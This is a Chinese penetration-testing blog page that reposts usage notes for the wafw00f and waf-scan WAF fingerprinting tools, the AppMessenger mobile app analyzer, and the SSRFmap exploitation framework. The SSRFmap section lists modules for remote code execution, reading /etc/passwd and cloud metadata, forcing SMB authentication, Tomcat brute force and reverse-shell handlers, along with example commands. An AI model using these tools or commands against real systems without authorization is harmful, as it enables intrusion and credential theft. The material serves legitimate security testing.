class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">$ wafw00f -l</span><br><span class="line"></span><br><span class="line">                   ______</span><br><span class="line">                  /      \</span><br><span class="line">                 (  Woof! )</span><br><span class="line">                  \  ____/                      )</span><br><span class="line">                  ,,                           ) (_</span><br><span class="line">             .-. -    _______                 ( |__|</span><br><span class="line">            ()``; |==|_______)                .)|__|</span><br><span class="line">            / (&#x27;        /|\                  (  |__|</span><br><span class="line">        (  /  )        / | \                  . |__|</span><br><span class="line">         \(_)_))      /  |  \                   |__|</span><br><span class="line"></span><br><span class="line">                    ~ WAFW00F : v2.2.0 ~</span><br><span class="line">    The Web Application Firewall Fingerprinting Toolkit</span><br><span class="line"></span><br><span class="line">[+] Can test for these WAFs:</span><br><span class="line"></span><br><span class="line">  WAF Name                        Manufacturer</span><br><span class="line">  --------                        ------------</span><br><span class="line"></span><br><span class="line">  ACE XML Gateway                  Cisco</span><br><span class="line">  aeSecure                         aeSecure</span><br><span class="line">  AireeCDN                         Airee</span><br><span class="line">  Airlock                          Phion/Ergon</span><br><span class="line">  Alert Logic                      Alert Logic</span><br><span class="line">  AliYunDun                        Alibaba Cloud Computing</span><br><span class="line">  Anquanbao                        Anquanbao</span><br><span class="line">  AnYu                             AnYu Technologies</span><br><span class="line">  Approach                         Approach</span><br><span class="line">  AppWall                          Radware</span><br><span class="line">  Armor Defense                    Armor</span><br><span class="line">  ArvanCloud                       ArvanCloud</span><br><span class="line">  ASP.NET Generic                  Microsoft</span><br><span class="line">  ASPA Firewall                    ASPA Engineering Co.</span><br><span class="line">  Astra                            Czar Securities</span><br><span class="line">  AWS Elastic Load Balancer        Amazon</span><br><span class="line">  AzionCDN                         AzionCDN</span><br><span class="line">  Azure Front Door                 Microsoft</span><br><span class="line">  Barikode                         Ethic Ninja</span><br><span class="line">  Barracuda                        Barracuda Networks</span><br><span class="line">  Bekchy                           Faydata Technologies Inc.</span><br><span class="line">  Beluga CDN                       Beluga</span><br><span class="line">  BIG-IP Local Traffic Manager     F5 Networks</span><br><span class="line">  BinarySec                        BinarySec</span><br><span class="line">  BitNinja                         BitNinja</span><br><span class="line">  BlockDoS                         BlockDoS</span><br><span class="line">  Bluedon                          Bluedon IST</span><br><span class="line">  BulletProof Security Pro         AITpro Security</span><br><span class="line">  CacheWall                        Varnish</span><br><span class="line">  CacheFly CDN                     CacheFly</span><br><span class="line">  Comodo cWatch                    Comodo CyberSecurity</span><br><span class="line">  CdnNS Application Gateway        CdnNs/WdidcNet</span><br><span class="line">  ChinaCache Load Balancer         ChinaCache</span><br><span class="line">  Chuang Yu Shield                 Yunaq</span><br><span class="line">  Cloudbric                        Penta Security</span><br><span class="line">  Cloudflare                       Cloudflare Inc.</span><br><span class="line">  Cloudfloor                       Cloudfloor DNS</span><br><span class="line">  Cloudfront                       Amazon</span><br><span class="line">  CrawlProtect                     Jean-Denis Brun</span><br><span class="line">  DataPower                        IBM</span><br><span class="line">  DenyALL                          Rohde &amp; Schwarz CyberSecurity</span><br><span class="line">  Distil                           Distil Networks</span><br><span class="line">  DOSarrest                        DOSarrest Internet Security</span><br><span class="line">  DotDefender                      Applicure Technologies</span><br><span class="line">  DynamicWeb Injection Check       DynamicWeb</span><br><span class="line">  Edgecast                         Verizon Digital Media</span><br><span class="line">  Eisoo Cloud Firewall             Eisoo</span><br><span class="line">  Expression Engine                EllisLab</span><br><span class="line">  BIG-IP AppSec Manager            F5 Networks</span><br><span class="line">  BIG-IP AP Manager                F5 Networks</span><br><span class="line">  Fastly                           Fastly CDN</span><br><span class="line">  FirePass                         F5 Networks</span><br><span class="line">  FortiWeb                         Fortinet</span><br><span class="line">  GoDaddy Website Protection       GoDaddy</span><br><span class="line">  Greywizard                       Grey Wizard</span><br><span class="line">  Huawei Cloud Firewall            Huawei</span><br><span class="line">  HyperGuard                       Art of Defense</span><br><span class="line">  Imunify360                       CloudLinux</span><br><span class="line">  Incapsula                        Imperva Inc.</span><br><span class="line">  IndusGuard                       Indusface</span><br><span class="line">  Instart DX                       Instart Logic</span><br><span class="line">  ISA Server                       Microsoft</span><br><span class="line">  Janusec Application Gateway      Janusec</span><br><span class="line">  Jiasule                          Jiasule</span><br><span class="line">  Kona SiteDefender                Akamai</span><br><span class="line">  KS-WAF                           KnownSec</span><br><span class="line">  KeyCDN                           KeyCDN</span><br><span class="line">  LimeLight CDN                    LimeLight</span><br><span class="line">  LiteSpeed                        LiteSpeed Technologies</span><br><span class="line">  Open-Resty Lua Nginx             FLOSS</span><br><span class="line">  Oracle Cloud                     Oracle</span><br><span class="line">  Malcare                          Inactiv</span><br><span class="line">  MaxCDN                           MaxCDN</span><br><span class="line">  Mission Control Shield           Mission Control</span><br><span class="line">  ModSecurity                      SpiderLabs</span><br><span class="line">  NAXSI                            NBS Systems</span><br><span class="line">  Nemesida                         PentestIt</span><br><span class="line">  NevisProxy                       AdNovum</span><br><span class="line">  NetContinuum                     Barracuda Networks</span><br><span class="line">  NetScaler AppFirewall            Citrix Systems</span><br><span class="line">  Newdefend                        NewDefend</span><br><span class="line">  NexusGuard Firewall              NexusGuard</span><br><span class="line">  NinjaFirewall                    NinTechNet</span><br><span class="line">  NullDDoS Protection              NullDDoS</span><br><span class="line">  NSFocus                          NSFocus Global Inc.</span><br><span class="line">  OnMessage Shield                 BlackBaud</span><br><span class="line">  Palo Alto Next Gen Firewall      Palo Alto Networks</span><br><span class="line">  PerimeterX                       PerimeterX</span><br><span class="line">  PentaWAF                         Global Network Services</span><br><span class="line">  pkSecurity IDS                   pkSec</span><br><span class="line">  PT Application Firewall          Positive Technologies</span><br><span class="line">  PowerCDN                         PowerCDN</span><br><span class="line">  Profense                         ArmorLogic</span><br><span class="line">  Puhui                            Puhui</span><br><span class="line">  Qcloud                           Tencent Cloud</span><br><span class="line">  Qiniu                            Qiniu CDN</span><br><span class="line">  Qrator                           Qrator</span><br><span class="line">  Reblaze                          Reblaze</span><br><span class="line">  RSFirewall                       RSJoomla!</span><br><span class="line">  RequestValidationMode            Microsoft</span><br><span class="line">  Sabre Firewall                   Sabre</span><br><span class="line">  Safe3 Web Firewall               Safe3</span><br><span class="line">  Safedog                          SafeDog</span><br><span class="line">  Safeline                         Chaitin Tech.</span><br><span class="line">  SecKing                          SecKing</span><br><span class="line">  eEye SecureIIS                   BeyondTrust</span><br><span class="line">  SecuPress WP Security            SecuPress</span><br><span class="line">  SecureSphere                     Imperva Inc.</span><br><span class="line">  Secure Entry                     United Security Providers</span><br><span class="line">  SEnginx                          Neusoft</span><br><span class="line">  ServerDefender VP                Port80 Software</span><br><span class="line">  Shield Security                  One Dollar Plugin</span><br><span class="line">  Shadow Daemon                    Zecure</span><br><span class="line">  SiteGround                       SiteGround</span><br><span class="line">  SiteGuard                        Sakura Inc.</span><br><span class="line">  Sitelock                         TrueShield</span><br><span class="line">  SonicWall                        Dell</span><br><span class="line">  UTM Web Protection               Sophos</span><br><span class="line">  Squarespace                      Squarespace</span><br><span class="line">  SquidProxy IDS                   SquidProxy</span><br><span class="line">  StackPath                        StackPath</span><br><span class="line">  Sucuri CloudProxy                Sucuri Inc.</span><br><span class="line">  Tencent Cloud Firewall           Tencent Technologies</span><br><span class="line">  Teros                            Citrix Systems</span><br><span class="line">  Trafficshield                    F5 Networks</span><br><span class="line">  TransIP Web Firewall             TransIP</span><br><span class="line">  URLMaster SecurityCheck          iFinity/DotNetNuke</span><br><span class="line">  URLScan                          Microsoft</span><br><span class="line">  UEWaf                            UCloud</span><br><span class="line">  Varnish                          OWASP</span><br><span class="line">  Viettel                          Cloudrity</span><br><span class="line">  VirusDie                         VirusDie LLC</span><br><span class="line">  Wallarm                          Wallarm Inc.</span><br><span class="line">  WatchGuard                       WatchGuard Technologies</span><br><span class="line">  WebARX                           WebARX Security Solutions</span><br><span class="line">  WebKnight                        AQTRONIX</span><br><span class="line">  WebLand                          WebLand</span><br><span class="line">  RayWAF                           WebRay Solutions</span><br><span class="line">  WebSEAL                          IBM</span><br><span class="line">  WebTotem                         WebTotem</span><br><span class="line">  West263 CDN                      West263CDN</span><br><span class="line">  Wordfence                        Defiant</span><br><span class="line">  WP Cerber Security               Cerber Tech</span><br><span class="line">  WTS-WAF                          WTS</span><br><span class="line">  360WangZhanBao                   360 Technologies</span><br><span class="line">  XLabs Security WAF               XLabs</span><br><span class="line">  Xuanwudun                        Xuanwudun</span><br><span class="line">  Yundun                           Yundun</span><br><span class="line">  Yunsuo                           Yunsuo</span><br><span class="line">  Yunjiasu                         Baidu Cloud Computing</span><br><span class="line">  YXLink                           YxLink Technologies</span><br><span class="line">  Zenedge                          Zenedge</span><br><span class="line">  ZScaler                          Accenture</span><br></pre></td></tr></table></figure>



<h2 id="我该如何使用它？"><a href="#我该如何使用它？" class="headerlink" title="我该如何使用它？"></a>我该如何使用它？</h2><p><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f#how-do-i-install-it">首先，按照此处</a>所述安装工具。</p>
<p>如需帮助，您可以使用该<code>--help</code>选项。基本用法是将 URL 作为参数传递。例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$   wafw00f https://example.org</span><br><span class="line"></span><br><span class="line">                   ______</span><br><span class="line">                  /      \</span><br><span class="line">                 (  Woof! )</span><br><span class="line">                  \  ____/                      )</span><br><span class="line">                  ,,                           ) (_</span><br><span class="line">             .-. -    _______                 ( |__|</span><br><span class="line">            ()``; |==|_______)                .)|__|</span><br><span class="line">            / (&#x27;        /|\                  (  |__|</span><br><span class="line">        (  /  )        / | \                  . |__|</span><br><span class="line">         \(_)_))      /  |  \                   |__|</span><br><span class="line"></span><br><span class="line">                    ~ WAFW00F : v2.2.0 ~</span><br><span class="line">    The Web Application Firewall Fingerprinting Toolkit</span><br><span class="line"></span><br><span class="line">[*] Checking https://example.org</span><br><span class="line">[+] The site https://example.org is behind Edgecast (Verizon Digital Media) WAF.</span><br><span class="line">[~] Number of requests: 2</span><br></pre></td></tr></table></figure>



<h2 id="我该如何安装它？"><a href="#我该如何安装它？" class="headerlink" title="我该如何安装它？"></a>我该如何安装它？</h2><p>以下应该可以解决问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>也可以在 Docker 容器中运行它。首先克隆此存储库并使用<code>docker build . -t wafw00f</code>.现在你可以运行<code>docker run --rm -it wafw00f https://example.com</code></p>
<h2 id="下载和安装使用"><a href="#下载和安装使用" class="headerlink" title="下载和安装使用"></a>下载和安装使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#下载</span><br><span class="line">git clone https://github.com/EnableSecurity/wafw00f.git</span><br><span class="line">#安装</span><br><span class="line">python setup.py install</span><br><span class="line">#使用:</span><br><span class="line">wafw00f -l #显示所有防火墙</span><br><span class="line">wafw00f &lt;域名(需要携带http://或者https://)&gt; #运行</span><br><span class="line">#下载2</span><br><span class="line">https://github.com/EnableSecurity/wafw00f/releases/tag/v2.2.0</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/waf-scan%E8%AF%86%E5%88%AB%E9%98%B2%E7%81%AB%E5%A2%99%E5%B7%A5%E5%85%B7/">
                waf-scan识别防火墙工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="01-waf-scan"><a href="#01-waf-scan" class="headerlink" title="01. waf-scan"></a>01. waf-scan</h1><blockquote>
<p>前言：基于wafw00f的插件内容，实现多线程批量识别版本。</p>
<p>批量识别waf防火墙.</p>
<p> 如何运行的?</p>
<ul>
<li>发送<em>正常的</em>HTTP请求并分析响应；这确定了许多 WAF 解决方案。</li>
<li>如果不成功，它会发送许多（可能是恶意的）HTTP 请求，并使用简单的逻辑来推断它是哪个 WAF。</li>
<li>如果也不成功，它会分析之前返回的响应，并使用另一种简单的算法来猜测 WAF 或安全解决方案是否正在积极响应我们的攻击。</li>
</ul>
</blockquote>
<h2 id="1-1-Usage"><a href="#1-1-Usage" class="headerlink" title="1.1. Usage"></a>1.1. Usage</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 对单个目标进行扫描 #</span><br><span class="line">python waf-scan.py -t https://example.com</span><br><span class="line"></span><br><span class="line"># 对多个目标进行扫描 #</span><br><span class="line">python waf-scan.py -f targets.txt</span><br><span class="line"></span><br><span class="line"># 结果输出 #</span><br><span class="line">`/report/`目录下会生成对应目标的json结果文件。</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/jammny/waf-scan/blob/master/img.png"><img src="https://github.com/jammny/waf-scan/raw/master/img.png" alt="img.png"></a></p>
<h2 id="1-2-程序兼容性"><a href="#1-2-程序兼容性" class="headerlink" title="1.2. 程序兼容性"></a>1.2. 程序兼容性</h2><p>python版本 &gt;&#x3D; 3.8.0</p>
<h2 id="1-3-Update"><a href="#1-3-Update" class="headerlink" title="1.3. Update"></a>1.3. Update</h2><table>
<thead>
<tr>
<th>更新时间（版本）</th>
<th>更新内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>2023.8.15(v0.0.1)</td>
<td>内测版本</td>
<td>有问题联系我</td>
</tr>
</tbody></table>
<h2 id="1-4-Github链接"><a href="#1-4-Github链接" class="headerlink" title="1.4 Github链接"></a>1.4 Github链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/jammny/waf-scan">https://github.com/jammny/waf-scan</a></p>
<h2 id="1-5-下载命令"><a href="#1-5-下载命令" class="headerlink" title="1.5 下载命令"></a>1.5 下载命令</h2><p>git clone <a target="_blank" rel="noopener" href="https://github.com/jammny/waf-scan.git">https://github.com/jammny/waf-scan.git</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/APK%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E6%BC%8F%E6%B4%9E/">
                APK自动扫描漏洞
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="AppMessenger-appmsg"><a href="#AppMessenger-appmsg" class="headerlink" title="AppMessenger(appmsg)"></a>AppMessenger(appmsg)</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/releases/download/v4.6.3/appmsg4.6.3.zip">https://github.com/sulab999/AppMessenger/releases/download/v4.6.3/appmsg4.6.3.zip</a></p>
<p>jdk17下载地址:<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html</a></p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="解析APP"><a href="#解析APP" class="headerlink" title="解析APP"></a>解析APP</h2><p>一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS)辅助分析工具，可以帮助APP开发工程师、病毒分析师、漏洞&#x2F;安全研究员提高工作效率，帮助渗透测试工程师、攻击队成员&#x2F;红队成员快速收集到移动端中关键的资产信息并提供基本的信息输出,如：包名（packageName）、版本(versionName\versionCode)、应用签名(Signature)、文件MD5、SDK、URL、APP漏洞等信息。</p>
<h2 id="APK文件解析"><a href="#APK文件解析" class="headerlink" title="APK文件解析"></a>APK文件解析</h2><p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic1.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic2.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic3.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic3.png" alt="img"></a></p>
<h2 id="IPA文件解析"><a href="#IPA文件解析" class="headerlink" title="IPA文件解析"></a>IPA文件解析</h2><p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/ipa1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/ipa1.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/ipa2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/ipa2.png" alt="img"></a></p>
<h2 id="高级检测-目前只支持APK"><a href="#高级检测-目前只支持APK" class="headerlink" title="高级检测(目前只支持APK)"></a>高级检测(目前只支持APK)</h2><p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj1.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj2.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj3.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj3.png" alt="img"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>本项目始于SULAB安全团队，并联合知识星球：移动安全</li>
<li>如果您觉得这个项目对您有用，请点击本项目右上角的”star”按钮。</li>
<li>如果您想持续跟进新的版本情况，请点击本项目右上角的”Watch”按钮。</li>
<li>会在知识星球发布内测或特别版</li>
<li>新的功能或者需求会持续进行开发，欢迎提BUG。</li>
<li>后期更新版本见releases</li>
</ul>
<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><ul>
<li>APP病毒分析</li>
<li>APP漏洞挖掘</li>
<li>APP信息收集</li>
<li>日常渗透测试&#x2F;攻防演练中对APP中涉及的关键资产信息收集，比如URL地址、IP地址、关键字等信息的采集等。</li>
</ul>
<h1 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍:"></a>功能介绍:</h1><ul>
<li>[√] 支持任意文件MD5识别</li>
<li>[√] 支持DEX、APK、IPA文件的信息收集</li>
<li>[√] 支持Android壳识别（识别准确率99%，业界一流）</li>
<li>[√] 支持基础检测：文件路径、包名、版本名、文件MD5、文件SHA1、DEX MD5、文件大小、allowbackup、debuggable、打包时间</li>
<li>[√] 支持解析APP权限信息、签名信息、支持系统版本等其他信息</li>
<li>[√] 支持敏感信息检测，如：url、ip等</li>
<li>[√] 支持Windows系统、MacOS系统、*nux系列的系统</li>
<li>[√] APP漏洞检测</li>
<li>[×] 一键对APK文件重打包</li>
</ul>
<h1 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h1><ul>
<li>App文件解析需要使用JAVA环境,JAVA版本11及以上</li>
<li>检测java版本命令:java –version</li>
<li>启动:java -jar appmsg.jar</li>
<li>Pro版已集成java环境可开箱即用</li>
</ul>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>pro版 可直接安装使用</p>
<p>v4.5之前 建议使用jdk9或jdk1.8</p>
<p>v4.5-v4.6.3版本 1、如有java环境，可双击apkmsg.jar，即可启动，直接将APP拖入即可自动识别 2、如果无法打开或显示有乱码，可下载配套的jdk11，运行里面写好的脚本，即可一键启动 3、MAC和Linux系统需要对运行脚本和JAVA_HOME里的文件授予可执行权限，命令如下 chmod 777 运行mac&#x2F;运行linux.sh chmod -R 777 JAVA_HOME jdk11：<a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/releases/download/v4.6.2/jdk11.zip">https://github.com/sulab999/AppMessenger/releases/download/v4.6.2/jdk11.zip</a> <a target="_blank" rel="noopener" href="https://github.com/sulab999/AppMessenger/blob/master/pic/start.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/start.png" alt="start"></a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/SSRF%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/">
                SSRF漏洞自动化扫描与利用工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF 通常用于利用其他服务上的操作，该框架旨在轻松查找和利用这些服务。SSRFmap 将 Burp 请求文件作为输入和模糊测试的参数。</p>
<h2 id="Github链接"><a href="#Github链接" class="headerlink" title="Github链接:"></a>Github链接:</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>以下模块已实现并且可以与<code>-m</code>参数一起使用。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>fastcgi</code></td>
<td>FastCGI 远程代码执行</td>
</tr>
<tr>
<td><code>redis</code></td>
<td>Redis 远程代码执行</td>
</tr>
<tr>
<td><code>github</code></td>
<td>Github 企业 RCE &lt; 2.8.7</td>
</tr>
<tr>
<td><code>zabbix</code></td>
<td>Zabbix 远程代码执行</td>
</tr>
<tr>
<td><code>mysql</code></td>
<td>MySQL命令执行</td>
</tr>
<tr>
<td><code>postgres</code></td>
<td>Postgres 命令执行</td>
</tr>
<tr>
<td><code>docker</code></td>
<td>通过 API 泄露 Docker 信息</td>
</tr>
<tr>
<td><code>smtp</code></td>
<td>SMTP发送邮件</td>
</tr>
<tr>
<td><code>portscan</code></td>
<td>扫描主机的前 8000 个端口</td>
</tr>
<tr>
<td><code>networkscan</code></td>
<td>HTTP Ping 扫描网络</td>
</tr>
<tr>
<td><code>readfiles</code></td>
<td>读取文件，例如<code>/etc/passwd</code></td>
</tr>
<tr>
<td><code>alibaba</code></td>
<td>从提供者读取文件（例如：元数据、用户数据）</td>
</tr>
<tr>
<td><code>aws</code></td>
<td>从提供者读取文件（例如：元数据、用户数据）</td>
</tr>
<tr>
<td><code>gce</code></td>
<td>从提供者读取文件（例如：元数据、用户数据）</td>
</tr>
<tr>
<td><code>digitalocean</code></td>
<td>从提供者读取文件（例如：元数据、用户数据）</td>
</tr>
<tr>
<td><code>socksproxy</code></td>
<td>SOCKS4代理</td>
</tr>
<tr>
<td><code>smbhash</code></td>
<td>通过 UNC 路径强制 SMB 身份验证</td>
</tr>
<tr>
<td><code>tomcat</code></td>
<td>针对 Tomcat Manager 的暴力攻击</td>
</tr>
<tr>
<td><code>custom</code></td>
<td>将自定义数据发送到监听服务，例如：netcat</td>
</tr>
<tr>
<td><code>memcache</code></td>
<td>将数据存储在 memcache 实例中</td>
</tr>
</tbody></table>
<h2 id="安装和手册"><a href="#安装和手册" class="headerlink" title="安装和手册"></a>安装和手册</h2><p>从 Github 存储库进行基本安装。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/swisskyrepo/SSRFmap.git</span><br><span class="line">$ cd SSRFmap/</span><br><span class="line">$ pip3 install -r requirements.txt</span><br><span class="line">$ python3 ssrfmap.py</span><br><span class="line"></span><br><span class="line">  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]</span><br><span class="line">                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]</span><br><span class="line">                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]</span><br><span class="line"></span><br><span class="line">  optional arguments:</span><br><span class="line">    -h, --help          show this help message and exit</span><br><span class="line">    -r REQFILE          SSRF Request file</span><br><span class="line">    -p PARAM            SSRF Parameter to target</span><br><span class="line">    -m MODULES          SSRF Modules to enable</span><br><span class="line">    -l HANDLER          Start an handler for a reverse shell</span><br><span class="line">    -v [VERBOSE]        Enable verbosity</span><br><span class="line">    --lhost LHOST       LHOST reverse shell</span><br><span class="line">    --lport LPORT       LPORT reverse shell</span><br><span class="line">    --uagent USERAGENT  User Agent to use</span><br><span class="line">    --ssl [SSL]         Use HTTPS without verification</span><br><span class="line">    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)</span><br><span class="line">    --level [LEVEL]     Level of test to perform (1-5, default: 1)</span><br></pre></td></tr></table></figure>



<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>首先，您需要一个带有参数的请求来进行模糊测试，Burp 请求与 SSRFmap 配合良好。它们应该如下所示。<strong>&#x2F;data</strong>文件夹中提供了更多示例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://mysimple.ssrf/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">url=https%3A%2F%2Fwww.google.fr</span><br></pre></td></tr></table></figure>



<p>使用<code>-m</code>后跟模块名称（<code>,</code>如果要启动多个模块，则用 ‘,’ 分隔）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Launch a portscan on localhost and read default files</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan</span><br></pre></td></tr></table></figure>



<p>如果您需要自定义用户代理，请使用<code>--uagent</code>. 某些目标将使用 HTTPS，您可以使用 启用它<code>--ssl</code>。</p>
